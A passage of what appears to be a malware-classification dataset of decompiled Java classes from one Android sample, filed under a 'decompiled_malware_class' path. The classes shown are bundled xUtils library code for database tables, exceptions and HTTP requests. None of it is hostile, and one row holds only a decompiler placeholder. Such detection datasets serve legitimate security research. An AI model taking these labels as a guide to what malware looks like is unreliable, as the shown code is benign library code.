    return;       }     }     try {       Method method=this.setMethod;       Object[] objArr=new Object[1];       if (fieldValue == null) {         fieldValue=this.defaultValue;       }       objArr[0]=fieldValue;       method.invoke(obj,objArr);     }  catch (    Throwable th2) {       LogUtils.e(th2.getMessage(),th2);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\ColumnUtils.code","public class ColumnUtils {   private static final HashSet<String> DB_PRIMITIVE_TYPES=new HashSet<>(14); static {     DB_PRIMITIVE_TYPES.add(Integer.TYPE.getName());     DB_PRIMITIVE_TYPES.add(Long.TYPE.getName());     DB_PRIMITIVE_TYPES.add(Short.TYPE.getName());     DB_PRIMITIVE_TYPES.add(Byte.TYPE.getName());     DB_PRIMITIVE_TYPES.add(Float.TYPE.getName());     DB_PRIMITIVE_TYPES.add(Double.TYPE.getName());     DB_PRIMITIVE_TYPES.add(Integer.class.getName());     DB_PRIMITIVE_TYPES.add(Long.class.getName());     DB_PRIMITIVE_TYPES.add(Short.class.getName());     DB_PRIMITIVE_TYPES.add(Byte.class.getName());     DB_PRIMITIVE_TYPES.add(Float.class.getName());     DB_PRIMITIVE_TYPES.add(Double.class.getName());     DB_PRIMITIVE_TYPES.add(String.class.getName());     DB_PRIMITIVE_TYPES.add(byte[].class.getName());   }   private ColumnUtils(){   }   public static Object convert2DbColumnValueIfNeeded(  Object obj){     ColumnConverter columnConverter;     if (obj == null) {       return obj;     }     Class<?> cls=obj.getClass();     return (isDbPrimitiveType(cls) || (columnConverter=ColumnConverterFactory.getColumnConverter(cls)) == null) ? obj : columnConverter.fieldValue2ColumnValue(obj);   }   private static Method getBooleanColumnGetMethod(  Class<?> cls,  String str){     String str2=""is"" + str.substring(0,1).toUpperCase() + str.substring(1);     if (!isStartWithIs(str)) {       str=str2;     }     try {       return cls.getDeclaredMethod(str,new Class[0]);     }  catch (    NoSuchMethodException e) {       LogUtils.d(str + "" not exist"");       return null;     }   }   private static Method getBooleanColumnSetMethod(  Class<?> cls,  Field field){     String name=field.getName();     String str=isStartWithIs(field.getName()) ? ""set"" + name.substring(2,3).toUpperCase() + name.substring(3) : ""set"" + name.substring(0,1).toUpperCase() + name.substring(1);     try {       return cls.getDeclaredMethod(str,field.getType());     }  catch (    NoSuchMethodException e) {       LogUtils.d(str + "" not exist"");       return null;     }   }   public static String getCheck(  Field field){     Check check=(Check)field.getAnnotation(Check.class);     if (check != null) {       return check.value();     }     return null;   }   public static String getColumnDefaultValue(  Field field){     com.fw.tzthree.lidroid.xutils.db.annotation.Column column=(com.fw.tzthree.lidroid.xutils.db.annotation.Column)field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Column.class);     if (column == null || TextUtils.isEmpty(column.defaultValue())) {       return null;     }     return column.defaultValue();   }   public static Method getColumnGetMethod(  Class<?> cls,  Field field){     String name=field.getName();     Method booleanColumnGetMethod=field.getType() == Boolean.TYPE ? getBooleanColumnGetMethod(cls,name) : null;     if (booleanColumnGetMethod == null) {       String str=""get"" + name.substring(0,1).toUpperCase() + name.substring(1);       try {         booleanColumnGetMethod=cls.getDeclaredMethod(str,new Class[0]);       }  catch (      NoSuchMethodException e) {         LogUtils.d(str + "" not exist"");       }     }     return (booleanColumnGetMethod != null || Object.class.equals(cls.getSuperclass())) ? booleanColumnGetMethod : getColumnGetMethod(cls.getSuperclass(),field);   }   public static String getColumnNameByField(  Field field){     com.fw.tzthree.lidroid.xutils.db.annotation.Column column=(com.fw.tzthree.lidroid.xutils.db.annotation.Column)field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Column.class);     if (column != null && !TextUtils.isEmpty(column.column())) {       return column.column();     }     com.fw.tzthree.lidroid.xutils.db.annotation.Id id=(com.fw.tzthree.lidroid.xutils.db.annotation.Id)field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Id.class);     if (id != null && !TextUtils.isEmpty(id.column())) {       return id.column();     }     com.fw.tzthree.lidroid.xutils.db.annotation.Foreign foreign=(com.fw.tzthree.lidroid.xutils.db.annotation.Foreign)field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Foreign.class);     return (foreign == null || TextUtils.isEmpty(foreign.column())) ? ((com.fw.tzthree.lidroid.xutils.db.annotation.Finder)field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Finder.class)) != null ? field.getName() : field.getName() : foreign.column();   }   public static Method getColumnSetMethod(  Class<?> cls,  Field field){     String name=field.getName();     Method booleanColumnSetMethod=field.getType() == Boolean.TYPE ? getBooleanColumnSetMethod(cls,field) : null;     if (booleanColumnSetMethod == null) {       String str=""set"" + name.substring(0,1).toUpperCase() + name.substring(1);       try {         booleanColumnSetMethod=cls.getDeclaredMethod(str,field.getType());       }  catch (      NoSuchMethodException e) {         LogUtils.d(str + "" not exist"");       }     }     return (booleanColumnSetMethod != null || Object.class.equals(cls.getSuperclass())) ? booleanColumnSetMethod : getColumnSetMethod(cls.getSuperclass(),field);   }   public static Class<?> getFinderTargetEntityType(  Finder finder){     Class<?> type=finder.getColumnField().getType();     return (type.equals(FinderLazyLoader.class) || type.equals(List.class)) ? (Class)((ParameterizedType)finder.getColumnField().getGenericType()).getActualTypeArguments()[0] : type;   }   public static String getForeignColumnNameByField(  Field field){     com.fw.tzthree.lidroid.xutils.db.annotation.Foreign foreign=(com.fw.tzthree.lidroid.xutils.db.annotation.Foreign)field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Foreign.class);     return foreign != null ? foreign.foreign() : field.getName();   }   public static Class<?> getForeignEntityType(  Foreign foreign){     Class<?> type=foreign.getColumnField().getType();     return (type.equals(ForeignLazyLoader.class) || type.equals(List.class)) ? (Class)((ParameterizedType)foreign.getColumnField().getGenericType()).getActualTypeArguments()[0] : type;   }   public static boolean isDbPrimitiveType(  Class<?> cls){     return DB_PRIMITIVE_TYPES.contains(cls.getName());   }   public static boolean isFinder(  Field field){     return field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Finder.class) != null;   }   public static boolean isForeign(  Field field){     return field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Foreign.class) != null;   }   public static boolean isNotNull(  Field field){     return field.getAnnotation(NotNull.class) != null;   }   private static boolean isStartWithIs(  String str){     return str != null && str.startsWith(""is"");   }   public static boolean isTransient(  Field field){     return field.getAnnotation(Transient.class) != null;   }   public static boolean isUnique(  Field field){     return field.getAnnotation(Unique.class) != null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\DbModel.code","public class DbModel {   private HashMap<String,String> dataMap=new HashMap<>();   public void add(  String str,  String str2){     this.dataMap.put(str,str2);   }   public boolean getBoolean(  String str){     String str2=this.dataMap.get(str);     if (str2 != null) {       return str2.length() == 1 ? ""1"".equals(str2) : Boolean.valueOf(str2).booleanValue();     }     return false;   }   public HashMap<String,String> getDataMap(){     return this.dataMap;   }   public Date getDate(  String str){     return new Date(Long.valueOf(this.dataMap.get(str)).longValue());   }   public double getDouble(  String str){     return Double.valueOf(this.dataMap.get(str)).doubleValue();   }   public float getFloat(  String str){     return Float.valueOf(this.dataMap.get(str)).floatValue();   }   public int getInt(  String str){     return Integer.valueOf(this.dataMap.get(str)).intValue();   }   public long getLong(  String str){     return Long.valueOf(this.dataMap.get(str)).longValue();   }   public java.sql.Date getSqlDate(  String str){     return new java.sql.Date(Long.valueOf(this.dataMap.get(str)).longValue());   }   public String getString(  String str){     return this.dataMap.get(str);   }   public boolean isEmpty(  String str){     return TextUtils.isEmpty(this.dataMap.get(str));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\Finder.code","public class Finder extends Column {   private final String targetColumnName;   private final String valueColumnName;   public Finder(  Class<?> cls,  Field field){     super(cls,field);     com.fw.tzthree.lidroid.xutils.db.annotation.Finder finder=(com.fw.tzthree.lidroid.xutils.db.annotation.Finder)field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Finder.class);     this.valueColumnName=finder.valueColumn();     this.targetColumnName=finder.targetColumn();   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.TEXT;   }   @Override public Object getColumnValue(  Object obj){     return null;   }   @Override public Object getDefaultValue(){     return null;   }   public String getTargetColumnName(){     return this.targetColumnName;   }   public Class<?> getTargetEntityType(){     return ColumnUtils.getFinderTargetEntityType(this);   }   @Override public void setValue2Entity(  Object obj,  Cursor cursor,  int i){     Object obj2=null;     Class<?> type=this.columnField.getType();     Object columnValue=TableUtils.getColumnOrId(obj.getClass(),this.valueColumnName).getColumnValue(obj);     if (type.equals(FinderLazyLoader.class)) {       obj2=new FinderLazyLoader(this,columnValue);     }  else     if (type.equals(List.class)) {       try {         obj2=new FinderLazyLoader(this,columnValue).getAllFromDb();       }  catch (      DbException e) {         LogUtils.e(e.getMessage(),e);       }     }  else {       try {         obj2=new FinderLazyLoader(this,columnValue).getFirstFromDb();       }  catch (      DbException e2) {         LogUtils.e(e2.getMessage(),e2);       }     }     if (this.setMethod != null) {       try {         this.setMethod.invoke(obj,obj2);         return;       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         return;       }     }     try {       this.columnField.setAccessible(true);       this.columnField.set(obj,obj2);     }  catch (    Throwable th2) {       LogUtils.e(th2.getMessage(),th2);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\Foreign.code","public class Foreign extends Column {   private final ColumnConverter foreignColumnConverter;   private final String foreignColumnName;   public Foreign(  Class<?> cls,  Field field){     super(cls,field);     this.foreignColumnName=ColumnUtils.getForeignColumnNameByField(field);     this.foreignColumnConverter=ColumnConverterFactory.getColumnConverter(TableUtils.getColumnOrId(getForeignEntityType(),this.foreignColumnName).columnField.getType());   }   @Override public ColumnDbType getColumnDbType(){     return this.foreignColumnConverter.getColumnDbType();   }   @Override public Object getColumnValue(  Object obj){     Object obj2;     Throwable th;     Object obj3;     Throwable th2;     Object fieldValue=getFieldValue(obj);     if (fieldValue != null) {       Class<?> type=this.columnField.getType();       if (type.equals(ForeignLazyLoader.class)) {         return ((ForeignLazyLoader)fieldValue).getColumnValue();       }       if (type.equals(List.class)) {         try {           List list=(List)fieldValue;           if (list.size() > 0) {             Column columnOrId=TableUtils.getColumnOrId(ColumnUtils.getForeignEntityType(this),this.foreignColumnName);             Object columnValue=columnOrId.getColumnValue(list.get(0));             try {               Table table=getTable();               if (table != null && (columnOrId instanceof Id)) {                 for (                Object obj4 : list) {                   if (columnOrId.getColumnValue(obj4) == null) {                     table.db.saveOrUpdate(obj4);                   }                 }               }               return columnOrId.getColumnValue(list.get(0));             }  catch (            Throwable th3) {               obj3=columnValue;               th2=th3;               LogUtils.e(th2.getMessage(),th2);               return obj3;             }           }         }  catch (        Throwable th4) {           obj3=null;           th2=th4;         }       }  else {         try {           Column columnOrId2=TableUtils.getColumnOrId(type,this.foreignColumnName);           Object columnValue2=columnOrId2.getColumnValue(fieldValue);           try {             Table table2=getTable();             if (table2 != null && columnValue2 == null && (columnOrId2 instanceof Id)) {               table2.db.saveOrUpdate(fieldValue);             }             return columnOrId2.getColumnValue(fieldValue);           }  catch (          Throwable th5) {             obj2=columnValue2;             th=th5;             LogUtils.e(th.getMessage(),th);             return obj2;           }         }  catch (        Throwable th6) {           obj2=null;           th=th6;         }       }     }     return null;   }   @Override public Object getDefaultValue(){     return null;   }   public String getForeignColumnName(){     return this.foreignColumnName;   }   public Class<?> getForeignEntityType(){     return ColumnUtils.getForeignEntityType(this);   }   @Override public void setValue2Entity(  Object obj,  Cursor cursor,  int i){     Object fieldValue=this.foreignColumnConverter.getFieldValue(cursor,i);     if (fieldValue == null) {       return;     }     Object obj2=null;     Class<?> type=this.columnField.getType();     if (type.equals(ForeignLazyLoader.class)) {       obj2=new ForeignLazyLoader(this,fieldValue);     }  else     if (type.equals(List.class)) {       try {         obj2=new ForeignLazyLoader(this,fieldValue).getAllFromDb();       }  catch (      DbException e) {         LogUtils.e(e.getMessage(),e);       }     }  else {       try {         obj2=new ForeignLazyLoader(this,fieldValue).getFirstFromDb();       }  catch (      DbException e2) {         LogUtils.e(e2.getMessage(),e2);       }     }     if (this.setMethod != null) {       try {         this.setMethod.invoke(obj,obj2);         return;       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         return;       }     }     try {       this.columnField.setAccessible(true);       this.columnField.set(obj,obj2);     }  catch (    Throwable th2) {       LogUtils.e(th2.getMessage(),th2);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\Id.code","public class Id extends Column {   private String columnFieldClassName;   private boolean isAutoIncrement;   private boolean isAutoIncrementChecked;   private static final HashSet<String> INTEGER_TYPES=new HashSet<>(2);   private static final HashSet<String> AUTO_INCREMENT_TYPES=new HashSet<>(4); static {     INTEGER_TYPES.add(Integer.TYPE.getName());     INTEGER_TYPES.add(Integer.class.getName());     AUTO_INCREMENT_TYPES.addAll(INTEGER_TYPES);     AUTO_INCREMENT_TYPES.add(Long.TYPE.getName());     AUTO_INCREMENT_TYPES.add(Long.class.getName());   }   public Id(  Class<?> cls,  Field field){     super(cls,field);     this.isAutoIncrementChecked=false;     this.isAutoIncrement=false;     this.columnFieldClassName=this.columnField.getType().getName();   }   @Override public Object getColumnValue(  Object obj){     Object columnValue=super.getColumnValue(obj);     if (columnValue == null) {       return null;     }     if (isAutoIncrement() && (columnValue.equals(0) || columnValue.equals(0L))) {       return null;     }     return columnValue;   }   public boolean isAutoIncrement(){     if (!this.isAutoIncrementChecked) {       this.isAutoIncrementChecked=true;       this.isAutoIncrement=this.columnField.getAnnotation(NoAutoIncrement.class) == null && AUTO_INCREMENT_TYPES.contains(this.columnFieldClassName);     }     return this.isAutoIncrement;   }   public void setAutoIncrementId(  Object obj,  long j){     Object valueOf=Long.valueOf(j);     if (INTEGER_TYPES.contains(this.columnFieldClassName)) {       valueOf=Integer.valueOf((int)j);     }     if (this.setMethod != null) {       try {         this.setMethod.invoke(obj,valueOf);         return;       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         return;       }     }     try {       this.columnField.setAccessible(true);       this.columnField.set(obj,valueOf);     }  catch (    Throwable th2) {       LogUtils.e(th2.getMessage(),th2);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\KeyValue.code","public class KeyValue {   public final String key;   public final Object value;   public KeyValue(  String str,  Object obj){     this.key=str;     this.value=obj;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\Table.code","public class Table {   private static final HashMap<String,Table> tableMap=new HashMap<>();   private boolean checkedDatabase;   public final HashMap<String,Column> columnMap;   public final DbUtils db;   public final HashMap<String,Finder> finderMap=new HashMap<>();   public final Id id;   public final String tableName;   private Table(  DbUtils dbUtils,  Class<?> cls){     this.db=dbUtils;     this.tableName=TableUtils.getTableName(cls);     this.id=TableUtils.getId(cls);     this.columnMap=TableUtils.getColumnMap(cls);     for (    Column column : this.columnMap.values()) {       column.setTable(this);       if (column instanceof Finder) {         this.finderMap.put(column.getColumnName(),(Finder)column);       }     }   }   public static synchronized Table get(  DbUtils dbUtils,  Class<?> cls){     Table table; synchronized (Table.class) {       String str=dbUtils.getDaoConfig().getDbName() + ""#"" + cls.getName();       table=tableMap.get(str);       if (table == null) {         table=new Table(dbUtils,cls);         tableMap.put(str,table);       }     }     return table;   }   public static synchronized void remove(  DbUtils dbUtils,  Class<?> cls){ synchronized (Table.class) {       tableMap.remove(dbUtils.getDaoConfig().getDbName() + ""#"" + cls.getName());     }   }   public static synchronized void remove(  DbUtils dbUtils,  String str){     String str2; synchronized (Table.class) {       if (tableMap.size() > 0) {         String str3=null;         Iterator<Map.Entry<String,Table>> it=tableMap.entrySet().iterator();         while (true) {           if (!it.hasNext()) {             str2=str3;             break;           }           Map.Entry<String,Table> next=it.next();           Table value=next.getValue();           if (value == null || !value.tableName.equals(str)) {             str2=str3;           }  else {             str2=next.getKey();             if (str2.startsWith(dbUtils.getDaoConfig().getDbName() + ""#"")) {               break;             }           }           str3=str2;         }         if (TextUtils.isEmpty(str2)) {           tableMap.remove(str2);         }       }     }   }   public boolean isCheckedDatabase(){     return this.checkedDatabase;   }   public void setCheckedDatabase(  boolean z){     this.checkedDatabase=z;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\TableUtils.code","public class TableUtils {   private static ConcurrentHashMap<String,HashMap<String,Column>> entityColumnsMap=new ConcurrentHashMap<>();   private static ConcurrentHashMap<String,Id> entityIdMap=new ConcurrentHashMap<>();   private TableUtils(){   }   private static void addColumns2Map(  Class<?> cls,  String str,  HashMap<String,Column> hashMap){     if (Object.class.equals(cls)) {       return;     }     try {       for (      Field field : cls.getDeclaredFields()) {         if (!ColumnUtils.isTransient(field) && !Modifier.isStatic(field.getModifiers())) {           if (ColumnConverterFactory.isSupportColumnConverter(field.getType())) {             if (!field.getName().equals(str)) {               Column column=new Column(cls,field);               if (!hashMap.containsKey(column.getColumnName())) {                 hashMap.put(column.getColumnName(),column);               }             }           }  else           if (ColumnUtils.isForeign(field)) {             Foreign foreign=new Foreign(cls,field);             if (!hashMap.containsKey(foreign.getColumnName())) {               hashMap.put(foreign.getColumnName(),foreign);             }           }  else           if (ColumnUtils.isFinder(field)) {             Finder finder=new Finder(cls,field);             if (!hashMap.containsKey(finder.getColumnName())) {               hashMap.put(finder.getColumnName(),finder);             }           }         }       }       if (Object.class.equals(cls.getSuperclass())) {         return;       }       addColumns2Map(cls.getSuperclass(),str,hashMap);     }  catch (    Throwable th) {       LogUtils.e(th.getMessage(),th);     }   }   public static synchronized HashMap<String,Column> getColumnMap(  Class<?> cls){     HashMap<String,Column> hashMap; synchronized (TableUtils.class) {       if (entityColumnsMap.containsKey(cls.getName())) {         hashMap=entityColumnsMap.get(cls.getName());       }  else {         hashMap=new HashMap<>();         addColumns2Map(cls,getPrimaryKeyFieldName(cls),hashMap);         entityColumnsMap.put(cls.getName(),hashMap);       }     }     return hashMap;   }   public static Column getColumnOrId(  Class<?> cls,  String str){     return getPrimaryKeyColumnName(cls).equals(str) ? getId(cls) : getColumnMap(cls).get(str);   }   public static String getExecAfterTableCreated(  Class<?> cls){     com.fw.tzthree.lidroid.xutils.db.annotation.Table table=(com.fw.tzthree.lidroid.xutils.db.annotation.Table)cls.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Table.class);     if (table != null) {       return table.execAfterTableCreated();     }     return null;   }   public static synchronized Id getId(  Class<?> cls){     Field field;     Id id; synchronized (TableUtils.class) {       if (Object.class.equals(cls)) {         throw new RuntimeException(""field 'id' not found"");       }       if (entityIdMap.containsKey(cls.getName())) {         id=entityIdMap.get(cls.getName());       }  else {         Field[] declaredFields=cls.getDeclaredFields();         if (declaredFields != null) {           int length=declaredFields.length;           int i=0;           while (true) {             if (i >= length) {               field=null;               break;             }             field=declaredFields[i];             if (field.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Id.class) != null) {               break;             }             i++;           }           if (field == null) {             for (            Field field2 : declaredFields) {               if (""id"".equals(field2.getName()) || ""_id"".equals(field2.getName())) {                 field=field2;                 break;               }             }           }         }  else {           field=null;         }         if (field == null) {           id=getId(cls.getSuperclass());         }  else {           id=new Id(cls,field);           entityIdMap.put(cls.getName(),id);         }       }     }     return id;   }   private static String getPrimaryKeyColumnName(  Class<?> cls){     Id id=getId(cls);     if (id == null) {       return null;     }     return id.getColumnName();   }   private static String getPrimaryKeyFieldName(  Class<?> cls){     Id id=getId(cls);     if (id == null) {       return null;     }     return id.getColumnField().getName();   }   public static String getTableName(  Class<?> cls){     com.fw.tzthree.lidroid.xutils.db.annotation.Table table=(com.fw.tzthree.lidroid.xutils.db.annotation.Table)cls.getAnnotation(com.fw.tzthree.lidroid.xutils.db.annotation.Table.class);     return (table == null || TextUtils.isEmpty(table.name())) ? cls.getName().replace('.','_') : table.name();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.exception\BaseException.code","public class BaseException extends Exception {   private static final long serialVersionUID=1;   public BaseException(){   }   public BaseException(  String str){     super(str);   }   public BaseException(  String str,  Throwable th){     super(str,th);   }   public BaseException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.exception\DbException.code","public class DbException extends BaseException {   private static final long serialVersionUID=1;   public DbException(){   }   public DbException(  String str){     super(str);   }   public DbException(  String str,  Throwable th){     super(str,th);   }   public DbException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.exception\HttpException.code","public class HttpException extends BaseException {   private static final long serialVersionUID=1;   private int exceptionCode;   public HttpException(){   }   public HttpException(  int i){     this.exceptionCode=i;   }   public HttpException(  int i,  String str){     super(str);     this.exceptionCode=i;   }   public HttpException(  int i,  String str,  Throwable th){     super(str,th);     this.exceptionCode=i;   }   public HttpException(  int i,  Throwable th){     super(th);     this.exceptionCode=i;   }   public HttpException(  String str){     super(str);   }   public HttpException(  String str,  Throwable th){     super(str,th);   }   public HttpException(  Throwable th){     super(th);   }   public int getExceptionCode(){     return this.exceptionCode;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http\HeaderItem.code","public class HeaderItem {   public final Header header;   public final boolean overwrite;   public HeaderItem(  String str,  String str2){     this.overwrite=false;     this.header=new BasicHeader(str,str2);   }   public HeaderItem(  String str,  String str2,  boolean z){     this.overwrite=z;     this.header=new BasicHeader(str,str2);   }   public HeaderItem(  Header header){     this.overwrite=false;     this.header=header;   }   public HeaderItem(  Header header,  boolean z){     this.overwrite=z;     this.header=header;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http\HttpCache.code","public class HttpCache {   private static final int DEFAULT_CACHE_SIZE=102400;   private static final long DEFAULT_EXPIRY_TIME=60000;   private static long defaultExpiryTime=DEFAULT_EXPIRY_TIME;   private static final ConcurrentHashMap<String,Boolean> httpMethod_enabled_map=new ConcurrentHashMap<>(10);   private int cacheSize;   private final LruMemoryCache<String,String> mMemoryCache; static {     httpMethod_enabled_map.put(HttpRequest.HttpMethod.GET.toString(),true);   }   public HttpCache(){     this(DEFAULT_CACHE_SIZE,DEFAULT_EXPIRY_TIME);   }   public HttpCache(  int i,  long j){     this.cacheSize=DEFAULT_CACHE_SIZE;     this.cacheSize=i;     defaultExpiryTime=j;     this.mMemoryCache=new LruMemoryCache<String,String>(this.cacheSize){       @Override public int sizeOf(      String str,      String str2){         if (str2 == null) {           return 0;         }         return str2.length();       }     } ;   }   public static long getDefaultExpiryTime(){     return defaultExpiryTime;   }   public static void setDefaultExpiryTime(  long j){     defaultExpiryTime=j;   }   public void clear(){     this.mMemoryCache.evictAll();   }   public String get(  String str){     if (str != null) {       return this.mMemoryCache.get(str);     }     return null;   }   public boolean isEnabled(  HttpRequest.HttpMethod httpMethod){     if (httpMethod == null) {       return false;     }     Boolean bool=httpMethod_enabled_map.get(httpMethod.toString());     return bool == null ? false : bool.booleanValue();   }   public boolean isEnabled(  String str){     if (TextUtils.isEmpty(str)) {       return false;     }     Boolean bool=httpMethod_enabled_map.get(str.toUpperCase());     return bool == null ? false : bool.booleanValue();   }   public void put(  String str,  String str2){     put(str,str2,defaultExpiryTime);   }   public void put(  String str,  String str2,  long j){     if (str == null || str2 == null || j < 1) {       return;     }     this.mMemoryCache.put(str,str2,System.currentTimeMillis() + j);   }   public void setCacheSize(  int i){     this.mMemoryCache.setMaxSize(i);   }   public void setEnabled(  HttpRequest.HttpMethod httpMethod,  boolean z){     httpMethod_enabled_map.put(httpMethod.toString(),Boolean.valueOf(z));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http\HttpHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5103d83d"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http\NotUseApacheRedirectHandler.code","final class NotUseApacheRedirectHandler implements RedirectHandler {   private NotUseApacheRedirectHandler(){   }   @Override public URI getLocationURI(  HttpResponse httpResponse,  HttpContext httpContext){     return null;   }   @Override public boolean isRedirectRequested(  HttpResponse httpResponse,  HttpContext httpContext){     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.http\RequestParams.code","public class RequestParams {   private HttpEntity bodyEntity;   private List<NameValuePair> bodyParams;   private String charset;   private HashMap<String,ContentBody> fileParams;   private List<HeaderItem> headers;   private Priority priority;   private List<NameValuePair> queryStringParams; public class HeaderItem {     public final Header header;     public final boolean overwrite;     public HeaderItem(    String str,    String str2){       this.overwrite=false;       this.header=new BasicHeader(str,str2);     }     public HeaderItem(    String str,    String str2,    boolean z){       this.overwrite=z;       this.header=new BasicHeader(str,str2);     }     public HeaderItem(    Header header){       this.overwrite=false;       this.header=header;     }     public HeaderItem(    Header header,    boolean z){       this.overwrite=z;       this.header=header;     }   }   public RequestParams(){     this.charset=AsyncHttpResponseHandler.DEFAULT_CHARSET;   }   public RequestParams(  String str){     this.charset=AsyncHttpResponseHandler.DEFAULT_CHARSET;     if (TextUtils.isEmpty(str)) {       return;     }     this.charset=str;   }   public void addBodyParameter(  String str,  File file){     if (this.fileParams == null) {       this.fileParams=new HashMap<>();     }     this.fileParams.put(str,new FileBody(file));   }   public void addBodyParameter(  String str,  File file,  String str2){     if (this.fileParams == null) {       this.fileParams=new HashMap<>();     }     this.fileParams.put(str,new FileBody(file,str2));   }   public void addBodyParameter(  String str,  File file,  String str2,  String str3){     if (this.fileParams == null) {       this.fileParams=new HashMap<>();     }     this.fileParams.put(str,new FileBody(file,str2,str3));   }   public void addBodyParameter(  String str,  File file,  String str2,  String str3,  String str4){     if (this.fileParams == null) {       this.fileParams=new HashMap<>();     }     this.fileParams.put(str,new FileBody(file,str2,str3,str4));   }   public void addBodyParameter(  String str,  InputStream inputStream,  long j){     if (this.fileParams == null) {       this.fileParams=new HashMap<>();     }     this.fileParams.put(str,new InputStreamBody(inputStream,j));   }   public void addBodyParameter(  String str,  InputStream inputStream,  long j,  String str2){     if (this.fileParams == null) {       this.fileParams=new HashMap<>();     }     this.fileParams.put(str,new InputStreamBody(inputStream,j,str2));   }   public void addBodyParameter(  String str,  InputStream inputStream,  long j,  String str2,  String str3){     if (this.fileParams == null) {       this.fileParams=new HashMap<>();     }     this.fileParams.put(str,new InputStreamBody(inputStream,j,str2,str3));   }   public void addBodyParameter(  String str,  String str2){     if (this.bodyParams == null) {       this.bodyParams=new ArrayList();     }     this.bodyParams.add(new BasicNameValuePair(str,str2));   }   public void addBodyParameter(  List<NameValuePair> list){     if (this.bodyParams == null) {       this.bodyParams=new ArrayList();     }     if (list == null || list.size() <= 0) {       return;     }     Iterator<NameValuePair> it=list.iterator();     while (it.hasNext()) {       this.bodyParams.add(it.next());     }   }   public void addBodyParameter(  NameValuePair nameValuePair){     if (this.bodyParams == null) {       this.bodyParams=new ArrayList();     }     this.bodyParams.add(nameValuePair);   }   public void addHeader(  String str,  String str2){     if (this.headers == null) {       this.headers=new ArrayList();     }     this.headers.add(new HeaderItem(str,str2));   }   public void addHeader(  Header header){     if (this.headers == null) {       this.headers=new ArrayList();     }     this.headers.add(new HeaderItem(header));   }   public void addHeaders(  List<Header> list){     if (this.headers == null) {       this.headers=new ArrayList();     }     Iterator<Header> it=list.iterator();     while (it.hasNext()) {       this.headers.add(new HeaderItem(it.next()));     }   }   public void addQueryStringParameter(  String str,  String str2){     if (this.queryStringParams == null) {       this.queryStringParams=new ArrayList();     }     this.queryStringParams.add(new BasicNameValuePair(str,str2));   }   public void addQueryStringParameter(  List<NameValuePair> list){     if (this.queryStringParams == null) {       this.queryStringParams=new ArrayList();     }     if (list == null || list.size() <= 0) {       return;     }     Iterator<NameValuePair> it=list.iterator();     while (it.hasNext()) {       this.queryStringParams.add(it.next());     }   }   public void addQueryStringParameter(  NameValuePair nameValuePair){     if (this.queryStringParams == null) {       this.queryStringParams=new ArrayList();     }     this.queryStringParams.add(nameValuePair);   }   public String getCharset(){     return this.charset;   }   public HttpEntity getEntity(){     if (this.bodyEntity != null) {       return this.bodyEntity;     }     if (this.fileParams == null || this.fileParams.isEmpty()) {       if (this.bodyParams == null || this.bodyParams.isEmpty()) {         return null;       }       return new BodyParamsEntity(this.bodyParams,this.charset);     }     